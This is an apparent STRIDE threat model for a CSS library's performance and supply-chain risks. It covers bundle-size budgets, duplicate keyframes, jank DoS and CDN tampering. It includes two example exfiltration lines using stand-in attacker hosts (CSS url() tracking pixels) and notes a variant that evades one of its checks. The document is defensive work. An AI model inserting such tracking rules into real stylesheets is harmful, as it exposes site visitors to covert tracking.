# Threat Model 05 — Performance Engineering

**Status:** Active
**Date:** 2026-07-30
**Scope:** Performance regressions, jank denial-of-service, bundle bloat
as a supply-chain attack surface.
**Companion docs:**
- `docs/adr/05-performance-engineering.md`
- `docs/benchmarks/05-performance-engineering.md`
- `docs/plans/05-performance-engineering.md`
- `docs/checklists/05-performance-engineering.md`

---

## 1. Why performance is a security concern

Performance is not a feature; it is the substrate on which every feature
depends. A regression that doubles bundle size or halves frame rate is a
**denial-of-service condition** for users on metered networks, low-end
devices, or assistive technology. The security posture of RoyCSS includes:

1. **Availability** — the library must render in <2 s on a mid-tier phone.
   A 5 MB bundle breaks this for ~40% of global users.
2. **Integrity** — the published `dist/` must match the source. A
   supply-chain attack that injects 500 KB of malicious CSS (e.g.,
   `background: url(//attacker.com/track.png)` exfiltration) must be
   detectable by size-delta checks.
3. **Confidentiality** — large bundles leak information about which
   effects a site uses (an attacker can `fetch("/roycss.css")` and
   pattern-match). Critical-CSS inlining reduces this surface.
4. **Accessibility** — `prefers-reduced-motion` coverage is a security
   contract for users with vestibular disorders. A regression that
   removes the global rule is a real-world harm.

This threat model uses the **STRIDE** methodology (Spoofing, Tampering,
Repudiation, Information Disclosure, Denial of Service, Elevation of
Privilege) applied to performance.

---

## 2. Assets

| ID | Asset | Location | Sensitivity |
|---|---|---|---|
| A1 | `dist/roycss.css` (1.15 MB) | `dist/` | Public — integrity-critical |
| A2 | `dist/roycss.min.css` (990 KB) | `dist/` | Public — integrity-critical |
| A3 | `dist/effects.json` (534 KB) | `dist/` | Public — integrity-critical |
| A4 | `dist/effects.js` (3.4 KB ESM loader) | `dist/` | Public — integrity-critical |
| A5 | `dist/roycss-critical.css` (17 KB) | `dist/` | Public — integrity-critical |
| A6 | `perf/benchmark.ts` harness | `perf/` | Internal — controls CI gate |
| A7 | `perf/regression.test.ts` suite | `perf/` | Internal — controls CI gate |
| A8 | `perf/results/benchmark-report.json` | `perf/results/` | Internal — audit trail |
| A9 | `src/lib/effects-batch-*.ts` (34 files) | `src/lib/` | Internal — source of truth |
| A10 | The `roycss-` CSS class namespace | All | Public — integrity-critical (a collision would break consumer overrides) |

---

## 3. Adversaries

| ID | Adversary | Capability | Motivation |
|---|---|---|---|
| ADV1 | Malicious npm dependency | Compromises a transitive dep; injects CSS at build time | Exfiltrate data, degrade UX |
| ADV2 | Compromised maintainer token | Publishes a malicious version of `roycss` to npm | Supply-chain attack on every consumer |
| ADV3 | Careless contributor | Submits a PR that adds 200 KB of effects without checking budgets | Unwitting DoS |
| ADV4 | Bot scraper | Fetches `/roycss.css` to fingerprint which effects a site uses | Recon for targeted attacks |
| ADV5 | Browser extension | Modifies page CSS at runtime; can conflict with `roycss-` classes | UX degradation (intentional or not) |

---

## 4. STRIDE analysis

### 4.1 Spoofing (S)

**S1 — Counterfeit `dist/roycss.css` served from a CDN compromise.**
- **Asset:** A1, A2.
- **Adversary:** ADV2 (compromised token).
- **Attack:** Attacker publishes `roycss@1.4.1` with a malicious
  `roycss.css` that adds `background: url(//evil/track.png)` to every
  `.roycss-*` rule. Consumers update; every visitor is tracked.
- **Detection:** Bundle-size regression test (`dist/roycss.css < 1.5 MB`)
  catches additions. Color-contract test (no `#hex` outside `mask:`
  context) catches `url()` to a hex-coded domain. **But:** a clever
  attacker uses `oklch()` + `background-image: url(...)` which would
  not be caught.
- **Mitigation:** npm publish provenance (worklog task 04), subresource
  integrity on the marketing site's `<link>` tags, automated diff of
  `dist/` on every release.
- **Residual risk:** Medium. Provenance + SRI + diff catches most cases;
  a zero-day CSS injection vector remains theoretically possible.

**S2 — Counterfeit benchmark report.**
- **Asset:** A8.
- **Adversary:** ADV3 (careless contributor) or ADV2.
- **Attack:** Contributor runs `bun run perf/benchmark.ts`, sees a
  failure, manually edits `perf/results/benchmark-report.json` to show
  "pass" before committing. CI greenlights the PR.
- **Detection:** CI must run the benchmark fresh and compare against the
  committed report. Mismatch = block.
- **Mitigation:** The CI workflow (planned) runs `bun run perf/benchmark.ts`
  and compares the `exitCode` field. The committed JSON is for audit
  only, not for gating.
- **Residual risk:** Low once CI is wired.

### 4.2 Tampering (T)

**T1 — Bundle bloat via large `cssCode` strings.**
- **Asset:** A1, A9.
- **Adversary:** ADV3.
- **Attack:** Contributor adds a new effect with a 50 KB `cssCode`
  (e.g., an inline base64-encoded SVG background). The bundle grows by
  50 KB; the per-effect average jumps from 771 B to ~800 B. The
  `dist/roycss.css < 1.5 MB` test still passes (we're at 1.15 MB), but
  the trend is wrong.
- **Detection:** `effect-count/per-css-bytes` benchmark (target `< 1 KB`)
  catches single-effect bloat. The CI workflow should also track the
  trend over time (a `+10%` delta is suspicious even if absolute is fine).
- **Mitigation:** Reviewer checklist item: "Does this PR add an effect
  with `cssCode` > 2 KB? If yes, justify."
- **Residual risk:** Low.

**T2 — Duplicate `@keyframes` injection (the open bug).**
- **Asset:** A1, A9.
- **Adversary:** ADV3 (the FerrumCSS merge).
- **Attack:** Two effects declare `@keyframes roy-X` with identical
  bodies. The bundle grows by ~500 B per duplicate. Over 150 duplicates,
  ~75 KB of bloat. Worse: if a future PR changes one of the bodies, the
  cascade silently picks the last-defined one, breaking the other effect.
- **Detection:** `effect-count/keyframes-duplicates` benchmark (target
  `< 1`) — currently FAILS at 150. `no duplicate @keyframes names`
  regression test (marked `test.failing` until fixed).
- **Mitigation:** Phase 2 codemod (see ADR §2.4) that strips exact
  `(name, body)` duplicates.
- **Residual risk:** Medium. The bug is open; a divergent-body bug could
  land before the codemod runs.

**T3 — `will-change` proliferation.**
- **Asset:** A1.
- **Adversary:** ADV3.
- **Attack:** Contributor adds `will-change: transform` to every
  `.roycss-*` rule "for performance." Each forces a permanent GPU layer.
  On a 1,569-card page, this exhausts GPU memory on low-end devices.
- **Detection:** No benchmark currently measures `will-change` count.
  LABS-33 §4 documents V1 having 1,847 occurrences; current is 15.
- **Mitigation:** Add a benchmark: `will-change occurrences` with target
  `< 50` (Phase 2 — out of scope for this ADR but tracked in the plan).
- **Residual risk:** Low (current count is 15, well under any reasonable
  budget).

### 4.3 Repudiation (R)

**R1 — "The benchmark passed on my machine."**
- **Asset:** A6, A8.
- **Adversary:** ADV3.
- **Attack:** Contributor's PR fails CI benchmark. They claim "it
  passed locally — must be a CI flake." Without an audit trail, the
  reviewer cannot verify.
- **Detection:** The benchmark harness writes
  `perf/results/benchmark-report.json` with a timestamp and full
  numeric values. CI uploads this artifact on every run.
- **Mitigation:** Reviewer can diff the local report against the CI
  artifact. Mismatch in `value` fields = investigate.
- **Residual risk:** Low.

### 4.4 Information disclosure (I)

**I1 — Effect fingerprinting via `/roycss.css`.**
- **Asset:** A1.
- **Adversary:** ADV4 (bot scraper).
- **Attack:** Attacker fetches `/roycss.css`, sees the full 1.15 MB
  bundle. They now know every effect the site *might* use. Combined
  with HTML scraping, they can infer which effects are actually used.
- **Detection:** N/A — public asset by design.
- **Mitigation:** The critical-CSS approach (Tier 1, 17 KB inlined)
  means the full bundle is loaded via `<link rel="preload">` — still
  publicly fetchable. The only true mitigation is per-effect CSS files
  (ADR §3.4, future work), which would require the attacker to fetch
  1,569 files.
- **Residual risk:** High (accepted — public asset).

**I2 — `effects.json` metadata leakage.**
- **Asset:** A3.
- **Adversary:** ADV4.
- **Attack:** Attacker fetches `/effects.json`, sees the full catalog
  (names, descriptions, tags). They can infer the site's design language
  and target audience.
- **Detection:** N/A — public asset.
- **Mitigation:** Accepted. The metadata is intentionally public (it's
  the library's value proposition).
- **Residual risk:** High (accepted).

**I3 — Bundle size as a side-channel.**
- **Asset:** A1, A2.
- **Adversary:** ADV4.
- **Attack:** Attacker monitors the bundle size over time. A sudden
  50 KB increase suggests a new feature (e.g., a new effect category)
  before it's announced.
- **Detection:** N/A.
- **Mitigation:** Accept. Bundle size is public information.
- **Residual risk:** Low (cosmetic, not exploitable).

### 4.5 Denial of service (D)

**D1 — Jank DoS via animation storm.**
- **Asset:** A1.
- **Adversary:** ADV3 (or ADV5 — browser extension).
- **Attack:** A page renders 1,569 effect cards simultaneously, each
  with an infinite ambient animation. The browser's main thread is
  saturated; the page becomes unresponsive.
- **Detection:** `animation-jank/guaranteed-fps` benchmark (target
  `≥ 48 fps`) — currently 57 fps on top 20. But this only measures the
  top 20; the full 1,569-card case is not benchmarked.
- **Mitigation:** `VirtualScrollGrid` renders only 24 cards at a time
  (97.7% DOM reduction). `DynamicEffectCSS` injects CSS only for visible
  effects. `prefers-reduced-motion: reduce` disables all animations.
- **Residual risk:** Low for the marketing site (virtualized). Medium
  for npm consumers who render all 1,569 cards — they must implement
  their own virtualization.

**D2 — CSS parse DoS via giant bundle.**
- **Asset:** A1.
- **Adversary:** ADV3.
- **Attack:** Bundle grows past 5 MB. CSS parse time exceeds 500 ms on
  low-end devices; first paint is delayed beyond user tolerance.
- **Detection:** `bundle-size/roycss.css` benchmark (target `< 1.5 MB`).
- **Mitigation:** Budget enforced; any PR that exceeds 1.5 MB fails CI.
- **Residual risk:** Low.

**D3 — Memory exhaustion via catalog load.**
- **Asset:** A3.
- **Adversary:** ADV3.
- **Attack:** `effects.json` grows past 5 MB. JSON.parse allocates
  hundreds of MB of heap; low-end devices crash.
- **Detection:** `memory-footprint/catalog-heap` benchmark (target
  `< 1 MB`) — currently 458 KB. `bundle-size/effects.json` (target
  `< 700 KB`) — currently 534 KB.
- **Mitigation:** Budgets enforced.
- **Residual risk:** Low.

### 4.6 Elevation of privilege (E)

**E1 — `!important` cascade escalation.**
- **Asset:** A1.
- **Adversary:** ADV3.
- **Attack:** Contributor adds `!important` to a `.roycss-*` rule to
  "fix" a specificity bug. Consumers cannot override the rule without
  their own `!important`, leading to an arms race.
- **Detection:** No benchmark currently measures `!important` count.
  LABS-33 §8 documents V1 having 847 occurrences; current is 14 (all
  in `prefers-reduced-motion` and form-control contexts, documented as
  legitimate).
- **Mitigation:** Add a benchmark: `!important count` with target
  `< 20` (Phase 2). Reviewer checklist item: "Does this PR add
  `!important`? If yes, justify."
- **Residual risk:** Low (current count is 14, all legitimate).

**E2 — Selector specificity escalation.**
- **Asset:** A1.
- **Adversary:** ADV3.
- **Attack:** Contributor writes `.effects-grid .effect-card.featured
  .title:hover` (specificity 0,3,0) instead of `.roycss-X:hover`
  (specificity 0,2,0). Consumers cannot override.
- **Detection:** No benchmark. LABS-33 §6 prescribes `:where()` wrappers
  and selector depth ≤ 3.
- **Mitigation:** Phase 2 lint rule (out of scope for this ADR).
- **Residual risk:** Medium (no automated check currently).

---

## 5. Attack surface reduction

The following design choices reduce the attack surface:

1. **Zero JavaScript runtime.** RoyCSS ships CSS only. No `eval`, no
   `new Function`, no `setTimeout(string)`. The only JS is the
   `effects.js` loader (3.4 KB) which reads `effects.json` via
   `fs.readFileSync` — no network, no code execution.
2. **No `@import` in `roycss.css`.** All CSS is in one file. No
   external fetches, no DNS lookups, no TLS handshakes at runtime.
3. **No `url()` references in effect CSS** (verified by grep — only
   data-URIs in a few SVG-background effects, all legitimate).
4. **`prefers-reduced-motion` global rule** — single source of truth
   for motion suppression. Cannot be bypassed by a per-effect rule
   without `!important` (which the regression tests would flag).
5. **Critical CSS inlined in `<head>`** — reduces the window for a CDN
   spoofing attack (the critical CSS is part of the HTML document; an
   attacker would need to compromise the HTML response, not just the
   CSS file).
6. **SRI on full bundle `<link>** — planned for the marketing site
   (Phase 2). Once wired, a tampered `roycss.css` will fail the
   integrity check and not load.

---

## 6. Ongoing controls

| Control | Frequency | Owner | Evidence |
|---|---|---|---|
| Run `bun run perf/benchmark.ts` | Every PR touching `dist/` or `src/lib/effects-batch-*.ts` | CI | `perf/results/benchmark-report.json` |
| Run `bun test perf/regression.test.ts` | Every PR | CI | Test report |
| Run `bun run lint` | Every PR | CI | ESLint output |
| Audit `will-change` count | Quarterly | Perf eng | Manual `rg -c "will-change" dist/roycss.css` |
| Audit `!important` count | Quarterly | Perf eng | Manual `rg -o "!important" dist/roycss.css \| wc -l` |
| Audit `backdrop-filter` count | Quarterly | Perf eng | Manual `rg -c "backdrop-filter" dist/roycss.css` |
| Review `perf/results/benchmark-report.json` trend | Monthly | Perf eng | GitHub Actions artifacts |
| Update this threat model | Annually or on major architectural change | Perf eng | Git history of this file |

---

## 7. Incident response

If a performance regression is detected in production:

1. **Triage** — run `bun run perf/benchmark.ts` locally on `main`.
   Compare against the last known-good `perf/results/benchmark-report.json`.
2. **Bisect** — `git bisect` over the last 30 commits, running the
   benchmark at each step. The first commit where the benchmark fails
   is the regression.
3. **Revert or fix** — if the regression is unintended, revert. If
   intended (e.g., a new effect category added), update the ADR and
   the budget.
4. **Postmortem** — add a section to `docs/benchmarks/05-performance-engineering.md`
   documenting the regression, root cause, fix, and prevention.
5. **Tighten the budget** — if the regression was caught late, add a
   stricter benchmark or regression test to catch it earlier next time.

---

## 8. Residual risk summary

| Threat | Severity | Likelihood | Residual risk |
|---|---|---|---|
| S1 (counterfeit CSS) | High | Low | Medium (provenance + SRI) |
| S2 (counterfeit report) | Medium | Low | Low (CI reruns) |
| T1 (bundle bloat) | Medium | Medium | Low (budgets) |
| T2 (duplicate @keyframes) | Medium | High (current) | Medium (codemod pending) |
| T3 (will-change proliferation) | Medium | Low | Low (audit quarterly) |
| R1 (repudiation) | Low | Low | Low (audit trail) |
| I1 (fingerprinting) | Low | High | High (accepted — public asset) |
| I2 (metadata leakage) | Low | High | High (accepted — public asset) |
| I3 (size side-channel) | Low | Medium | Low (cosmetic) |
| D1 (jank DoS) | High | Low (virtualized) | Low (marketing site) / Medium (npm) |
| D2 (parse DoS) | High | Low | Low (budget) |
| D3 (memory DoS) | Medium | Low | Low (budget) |
| E1 (!important escalation) | Medium | Low | Low (audit quarterly) |
| E2 (specificity escalation) | Medium | Medium | Medium (no automated check) |

**Overall residual risk:** Low-Medium. The open items (T2 duplicate
@keyframes, E2 selector specificity) are tracked in the plan with Phase 2
remediation. All other threats are mitigated to Low or accepted as
inherent to a public CSS library.
